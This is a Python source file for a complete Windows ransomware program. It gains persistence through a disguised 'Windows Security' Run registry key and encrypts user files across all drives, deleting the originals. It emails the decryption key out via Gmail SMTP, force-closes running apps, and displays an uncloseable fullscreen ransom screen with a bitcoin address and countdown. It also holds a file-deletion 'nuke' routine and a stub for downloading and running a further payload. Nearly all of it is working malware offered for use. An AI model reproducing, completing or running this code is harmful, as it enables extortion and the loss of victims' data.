import os
import threading
from cryptography.fernet import Fernet
from email.message import EmailMessage
from random import choices
from string import ascii_letters, digits
import psutil
import smtplib
import time
import tkinter as tk
import sys
import shutil
import winreg
import base64
import requests

SENDER = ""
SENDER_P = ""  # App password here,
RECEIVER = ""
timer = 60 * 60 * 48  # 48 hours


# Payload
def insert_to_startup():
    # copy the file to C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\programs\\{FILE_NAME}
    PATH = sys.argv[0]
    if not os.path.exists(
            os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Microsoft", "Windows", "Start Menu",
                         "programs")):
        os.makedirs(os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Microsoft", "Windows", "Start Menu",
                                 "programs"))
    # Incase the file is already in it, else copy it
    try:
        shutil.copy(PATH,
                    os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Microsoft", "Windows", "Start Menu",
                                 "programs"))
    except shutil.SameFileError:
        pass

    user = os.getlogin()
    # Check if it's run as .py or .exe
    if sys.argv[0].endswith(".py"):
        FILE_NAME = sys.argv[0][sys.argv[0].rfind("/") + 1:]
    else:
        FILE_NAME = sys.argv[0][sys.argv[0].rfind("\\") + 1:]
    # Open the key, this would raise an WindowsError if the key doesn't exist
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0,
                             winreg.KEY_ALL_ACCESS)
    except WindowsError:
        # Create the key since it does not exist
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run")

    # Set the value on Computer\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
    winreg.SetValueEx(key, "Windows Security", 0, winreg.REG_SZ,
                      f"C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\programs\\{FILE_NAME}")
    winreg.CloseKey(key)


def file_find(key):
    user = os.getlogin()
    file_set = file_set_pri = file_set_avoid = set()
    # Requirements for files
    PRIORITY = (f"C:\\Users\\{user}\\Downloads", f"C:\\Users\\{user}\\Documents",
                f"C:\\Users\\{user}\\Pictures", f"C:\\Users\\{user}\\Videos",
                f"C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Recent")
    AVOID = (f"C:\\Users\\{user}\\Desktop",)
    EXTENSION = (".docx", ".pdf", ".doc", ".xls", ".xlsx", ".ppt", ".pptx", ".jpg", ".jpeg", ".png", ".bmp", ".mp3",
                 ".wma", ".wav", ".mp4", ".avi", ".mov", ".zip", ".rar", ".txt",)  # Detect the extension name

    # Add the rest of the drives to the tuple
    drives = [chr(x) + ":\\" for x in range(65, 91) if os.path.exists(chr(x) + ":")]

    # Get all the files in the pc

    for path in PRIORITY:
        for root, dirs, files in os.walk(path):
            for file in files:
                if file.endswith(EXTENSION) and (not file.startswith("~$")):
                    try:
                        file_set_pri.add(os.path.join(root, file))  # add it to the set

                    except Exception:  # NOQA
                        pass

    threads = []
    for file_path in file_set_pri:
        t = threading.Thread(target=encrypt_file, args=(file_path, key))
        threads.append(t)
        t.start()

    # Wait for all threads to complete
    for t in threads:
        t.join()

    for path in drives:
        for root, dirs, files in os.walk(path):
            for file in files:
                if file.endswith(EXTENSION) and (not file.startswith("~$")) and (file not in PRIORITY) and (file not in AVOID):
                    try:
                        # get the last modified time of the file
                        file_set.add(os.path.join(root, file))  # add it to the set
                    except Exception:  # NOQA
                        pass

    threads1 = []
    for file_path in file_set:
        t1 = threading.Thread(target=encrypt_file, args=(file_path, key))
        threads1.append(t1)
        t1.start()

    # Wait for all threads to complete
    for t1 in threads:
        t1.join()

    for path in AVOID:
        for root, dirs, files in os.walk(path):
            for file in files:
                if file.endswith(EXTENSION) and (not file.startswith("~$")) and (file.strip() != ""):
                    try:
                        # get the last modified time of the file
                        file_set_avoid.add(os.path.join(root, file))  # add it to the set
                    except Exception:  # NOQA
                        pass

    threads2 = []
    for file_path in file_set_avoid:
        t2 = threading.Thread(target=encrypt_file, args=(file_path, key))
        threads2.append(t2)
        t2.start()

        # Wait for all threads to complete
    for t2 in threads2:
        t2.join()

    # write it into a json file for the decryptor to read
    with open("files.json", "w", encoding="utf-8") as f:
        if file_set_pri != set():
            f.write(str(file_set_pri) + ", ")

        if file_set != set():
            f.write(str(file_set) + ", ")

        if file_set_avoid != set():
            f.write(str(file_set_avoid))
        f.close()


def encrypt_file(file_path, key):
    # Open the file in binary mode and read it
    try:
        with open(file_path, "rb") as file:
            file_data = file.read()

        # Generate a Fernet object using the key and encrypt the data
        fernet = Fernet(key)
        encrypted_data = fernet.encrypt(file_data)

        # Write the encrypted data to a new file
        with open(file_path + ".enc", "wb") as encrypted_file:
            encrypted_file.write(encrypted_data)

        # Delete the original file
        os.remove(file_path)
    except Exception:  # NOQA
        pass
    pass


# Sending the key
def send_email(key, attack_id):
    msg = EmailMessage()
    msg["Subject"] = f"Ransomware Report | Attack ID: {attack_id}"
    msg["From"] = SENDER
    msg["To"] = RECEIVER
    msg.set_content(f"""Desktop name: {os.getlogin()}
    Date: {time.strftime('%d/%m/%Y, %H:%M:%S')}
    Key: {key.decode()}
    Attack ID: {attack_id}""")

    with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
        smtp.login(SENDER, SENDER_P)
        smtp.send_message(msg)


# Disinfect
def find_to_decrypt():
    # get the files from files.json and decrypt them
    with open("files.json", "r", encoding="utf-8") as f:
        files = f.read()
        f.close()

        # cleaning the data
        filtered_files = [f.split("'")[1] for f in files.replace("\\\\", "\\")[1:-1].split(", ")]
        filtered_files = [f for f in filtered_files if f.strip() != ""]

    return filtered_files


def decrypt_file(file_path, key):
    # Open the encrypted file in binary mode
    pass
    try:
        with open(file_path + ".enc", "rb") as encrypted_file:
            # Read the encrypted data
            encrypted_data = encrypted_file.read()

        fernet = Fernet(key)
        decrypted_data = fernet.decrypt(encrypted_data)

        # Write the decrypted data to a new file
        with open(file_path, "wb") as decrypted_file:
            decrypted_file.write(decrypted_data)

        os.remove(file_path + ".enc")
    except Exception:  # NOQA
        pass


def disinfect_stidium():
    # Clean the files that were created
    os.remove("files.json")
    os.remove(os.path.join(os.environ["TEMP"], "temp23.txt.enc"))
    os.remove(f"C:\\Users\\{os.getlogin()}\\Downloads\\attack_id.txt")
    os.remove(os.path.join(os.environ["TEMP"], "pkg.txt.enc"))
    os.remove(os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Microsoft", "Windows", "Start Menu",
                           "programs", os.path.basename(__file__)))

    # Remove from startup
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0,
                         winreg.KEY_ALL_ACCESS)
    winreg.DeleteValue(key, "Windows Security")
    winreg.CloseKey(key)
    os.remove(os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Microsoft", "Windows", "Start Menu",
                           "programs", os.path.basename(__file__)))


# Post-infection
def post_infect():
    # Infect the host with a malware after it has been decrypted, did you expect me to just let it free?
    def download_payload(file_name, delete_before_trying):
        if delete_before_trying:
            try:
                os.remove(file_name)
            except FileNotFoundError:
                pass
        # Get the download link from the server
        d = requests.get(r"")  # TODO: put some link here to download the .exe version of the downloader
        # Download the file and save it to the same dir as the script
        r = requests.get(d.text, allow_redirects=True)

        with open(f"{file_name}.txt", "wb") as f:
            f.write(r.content)

        # change it to .exe
        os.rename(f"{file_name}.txt", f"{file_name}.exe")

        # run the exe and kill cmd task
        os.system(f"{file_name}.exe")
        os.system("taskkill /f /im cmd.exe")


def nuke_pc():
    # Nuke the PC, delete everything
    files = find_to_decrypt()

    def delete(file):
        try:
            # os.remove(file)
            print(file, "deleted")
        except Exception:  # NOQA
            pass

    threads5 = []
    for file_pth in files:
        t5 = threading.Thread(target=delete, args=file_pth)
        threads5.append(t5)
        t5.start()

    # Wait for all threads to complete
    for t in threads5:
        t.join()

    # Kill the program
    if sys.argv[0].endswith(".py"):
        os.system(f"taskkill /f /im python.exe")
    else:
        os.system(f"taskkill /f /im {os.path.basename(__file__)}")


# Ransom Screen
def popup_window(attack_id, key, email, attempts):
    # Create the main window
    root = tk.Tk()
    root.title("​​​​")

    # Override the close button to do nothing
    def do_nothing():  # NOQA
        pass

    def check_key(decrypt_key):
        with open(os.path.join(os.environ["temp"], "pkg.txt.enc"), "r") as f:
            data = f.read()
            attempt_loc = int(data.split("\n ")[0])
            countdown = int(data.split("\n ")[1])
            f.close()

        if key_entry.get() == decrypt_key.decode().lstrip("b'").rstrip("'"):
            attemps_label.config(text=f"Key successfully entered. Thank you for your cooperation.\n"
                                      f"Please wait as we decrypt your files,\n This window will be "
                                      f"closed automatically.")
            files = find_to_decrypt()

            threads3 = [disinfect_stidium()]
            for file_path in files:
                file_path += ".enc"
                t3 = threading.Thread(target=decrypt_file, args=(file_path, key_entry.get()))
                threads3.append(t3)
                t3.start()

            # Wait for all threads to complete
            for t3 in threads3:
                try:
                    t3.join()
                except Exception:  # NOQA
                    pass
        else:
            attempt_loc -= 1
            with open((os.path.join(os.environ["TEMP"], "pkg.txt.enc")), "w") as f:
                f.write(str(attempt_loc))
                f.write("\n " + str(countdown))

            attemps_label.config(text=f"Attempts remaining: {attempt_loc}")
            if attempt_loc == 0:
                nuke_pc()

    # Make it so the close, minimize, and maximize buttons do nothing
    root.attributes('-fullscreen', True)
    root.protocol("WM_DELETE_WINDOW", do_nothing)
    root.attributes("-topmost", True)
    root.wm_attributes("-disabled", True)
    root.resizable(False, False)

    # Do stuff here
    encrypted_files = find_to_decrypt()
    root.configure(bg="dark red")
    ransom_label = tk.Label(root, text=f"Your files have been encrypted! ({len(encrypted_files)} Files)", fg='white',
                            bg='dark red', font=('Helvetica', 16, 'bold'))
    ransom_label.pack()

    # Create a label to display the timer
    timer_label = tk.Label(root, text="Time remaining to pay ransom: 00:00:00", fg='white', bg='dark red',
                           font=('Helvetica', 16, 'bold'))
    timer_label.pack()

    # entrybox for the key
    key_label = tk.Label(root, text="Enter the key to decrypt your files:", fg='white', bg='dark red',
                         font=('Helvetica', 16, 'bold'), pady=10)
    key_label.pack()
    key_entry = tk.Entry(root, width=50)
    key_entry.pack()
    # Create a button to submit the key, give them only 5 tries
    tk.Label(root, text=" ", fg='white', bg='dark red',
             font=('Helvetica', 12, 'bold')).pack()  # spacing
    submit_button = tk.Button(root, text="Decrypt", command=lambda: check_key(key), fg='white', bg='dark red',
                              font=('Helvetica', 16, 'bold'), pady=10)
    submit_button.pack()

    # Create a frame to hold the listbox and scrollbar
    list_frame = tk.Frame(root, bg="dark red")
    list_frame.pack()
    files_list = tk.Listbox(list_frame, width=200, height=30)
    scrollbar = tk.Scrollbar(list_frame, orient="vertical")

    # Pack the listbox and scrollbar
    files_list.pack(side="left", fill="y")
    scrollbar.pack(side="right", fill="y")

    files_list.configure(yscrollcommand=scrollbar.set)
    scrollbar.config(command=files_list.yview)

    attemps_label = tk.Label(root, text=f"Attempts remaining: {attempts}", fg='white', bg='dark red',
                             font=('Helvetica', 16, 'bold'), pady=10)
    attemps_label.pack()

    for i in encrypted_files:
        files_list.insert("end", i)

    # payment info
    tk.Label(root, text=f"Pay us 0.01 bitcoin and send the proof to {email} in order to receive the key \n"
                        f"Bitcoin Address: bc1q7mjcwx726a63d233w39nw2gxsuxpahpacu8e3c", fg='white', bg='dark red',
             font=('Helvetica', 16, 'bold')).pack()
    tk.Label(root, text=f"Don't forget to put '{os.getlogin()}' and '{attack_id}' with the email else "
                        f"your key wont be delivered (Note: Don't try bypassing this,\nyour pc might be locked "
                        f"forever if you try)", fg='white',
             bg='dark red', font=('Helvetica', 16, 'bold')).pack()

    # a function to update the timer and encrypted files list
    def update_ransom():
        with open(os.path.join(os.environ["temp"], "pkg.txt.enc"), "r") as f:
            data = f.read()
            countdown = int(data.split("\n ")[1])
            f.close()

        # Calculate the number of hours, minutes, and seconds remaining
        hours, remainder = divmod(countdown, 3600)
        minutes, seconds = divmod(remainder, 60)

        # Format the timer as a string in hours:minutes:seconds format and update the timer label
        timer_str = f"{hours:02}:{minutes:02}:{seconds:02}"
        timer_label.configure(text=f"Time remaining to pay ransom: {timer_str}")

        # If the timer has reached 1, stop the timer
        if countdown == 1:
            nuke_pc()
        elif countdown > 1:
            # Decrement the timer and update attemps and time remaining
            countdown -= 1

            with open(os.path.join(os.environ["temp"], "pkg.txt.enc"), "r") as f:
                data = f.read()
                attempts = int(data.split("\n ")[0])  # NOQA, also this is to fix the bug where attempts wont decrease
                f.close()

            with open((os.path.join(os.environ["TEMP"], "pkg.txt.enc")), "w") as f:
                f.write(str(attempts))
                f.write("\n " + str(countdown))
                f.close()

            root.after(1000, update_ransom)
            root.update()

    root.after(1000, update_ransom)  # start
    root.mainloop()


def shut_apps():
    running_apps = {i.name() for i in psutil.process_iter()}

    AVOID = {"Microsoft.Photos.exe", "GoogleCrashHandler.exe", "SearchIndexer.exe", "SDXHelper.exe", "audiodg.exe",
             "sihost.exe", "dwm.exe", "wsc_proxy.exe", "aswEngSrv.exe", "wininit.exe", "aswidsagent.exe",
             "taskhostw.exe", "AVGUI.exe", "RtkNGUI64.exe", "atkexComSvc.exe", "SystemSettingsBroker.exe",
             "dasHost.exe", "lsass.exe", "WmiPrvSE.exe", "explorer.exe", "jusched.exe", "dllhost.exe", "atieclxx.exe",
             "smss.exe", "svchost.exe", "spoolsv.exe", "SgrmBroker.exe", "SearchApp.exe", "igfxCUIService.exe",
             "CompPkgSrv.exe", "SystemSettings.exe", "GoogleCrashHandler64.exe", "StartMenuExperienceHost.exe",
             "gamingservicesnet.exe","GoogleUpdate.exe" "PhoneExperienceHost.exe", "sppsvc.exe", "XboxApp.exe",
             "LockApp.exe", "NLSSRV32.EXE", "mongod.exe", "SppExtComObj.Exe", "fontdrvhost.exe", "RuntimeBroker.exe",
             "SecurityHealthSystray.exe", "services.exe", "ShellExperienceHost.exe", "TextInputHost.exe", "csrss.exe",
             "winlogon.exe", "SecurityHealthService.exe", "ctfmon.exe", "PresentationFontCache.exe", "warp-svc.exe",
             "WUDFHost.exe", "armsvc.exe", "ApplicationFrameHost.exe", "conhost.exe", "atiesrxx.exe",
             "AppVShNotify.exe"}

    AVOID2 = {"System Idle Process", "System", "Registry", "MemCompression"}

    for i in running_apps:
        if i not in AVOID and i not in AVOID2:
            os.system(f"taskkill /f /im {i}")


def main():
    global timer
    # check if temp23.txt exists in C:\\temp as a firstrun check
    if SENDER == "" or SENDER_P == "" or RECEIVER == "" or not (SENDER.endswith(".com")) or len(SENDER_P) != 16 or \
            not (RECEIVER.endswith(
                ".com")):  # if either of these conditions are met, stop it incase the user haven't set it up correctly
        print("Please set up the email settings on the top")
    else:
        if os.path.exists(os.path.join(os.environ["TEMP"], "temp23.txt.enc")) \
                and os.path.exists(os.path.join(os.environ["TEMP"], "pkg.txt.enc")) \
                and os.path.exists(f"C:\\Users\\{os.getlogin()}\\Downloads\\attack_id.txt"):
            with open(os.path.join(os.environ["TEMP"], "temp23.txt.enc"), "rb") as f:
                passw = f.read()
                passw = base64.b64decode(passw)
                f.close()

                with open(os.path.join(os.environ["TEMP"], "pkg.txt.enc"), "r") as f:  # NOQA
                    data = f.read()
                    attempts_used = int(data.split("\n ")[0])
                    timer_used = int(data.split("\n ")[1])
                    f.close()

                with open(os.path.join(f"C:\\Users\\{os.getlogin()}\\Downloads\\attack_id.txt"), "rb") as f:  # NOQA
                    attack_id = f.read()
                    f.close()

                timer = timer_used
                popup_window(attack_id, passw, RECEIVER, attempts_used)

        else:  # FIRSTRUN
            insert_to_startup()
            decrypt_key = Fernet.generate_key()
            attempt = 5

            # Generate a key using the Fernet module
            """Make the attack_id, since this is a small project, it's just a random number and no need to check if it's 
            duplicate due to statistical probability of it being duplicate is very low, 16 digits of random alphabet and 
            numbers is enough"""
            attack_id = ''.join(choices(ascii_letters + digits, k=16))

            # Specify the paths to the files you want to encrypt
            file_find(decrypt_key)

            # Send the key and attack ID to the attacker's email address
            send_email(decrypt_key, attack_id)

            # inject to start up and make a file called temp23.enc in c:\\temp to store the key because we are not
            # monsters
            with open(os.path.join(os.environ["TEMP"], "temp23.txt.enc"), "w") as f:
                f.write(base64.b64encode(decrypt_key).decode())
            with open(f"C:\\Users\\{os.getlogin()}\\Downloads\\attack_id.txt", "w") as f:
                f.write(attack_id)
            with open(os.path.join(os.environ["TEMP"], "pkg.txt.enc"), "w") as f:
                f.write(str(attempt))
                f.write("\n " + str(timer))
                f.close()
            # Pop-up window with the attack ID and Email to send the key to the attacker
            popup_window(attack_id, decrypt_key, RECEIVER, attempt)


if __name__ == "__main__":
    main()
